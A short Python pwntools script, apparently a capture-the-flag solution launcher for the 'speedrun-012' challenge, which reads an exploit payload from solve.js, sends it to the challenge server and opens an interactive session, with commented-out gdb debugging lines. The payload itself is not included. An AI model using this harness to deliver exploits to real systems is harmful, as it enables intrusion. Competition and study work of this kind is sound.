from pwn import *

context.terminal = ['tmux', 'split-window', '-h']
context.log_level = ['debug', 'info', 'warn'][1]

with open('solve.js', 'r') as f:
    data = f.read()

# r = process('./speedrun-012', aslr=1)
# gdb.attach(r, 'brva brva duk_bi_buffer_writefield')

r = connect('speedrun-012.quals2019.oooverflow.io', 31337)
r.send(data)
r.interactive()
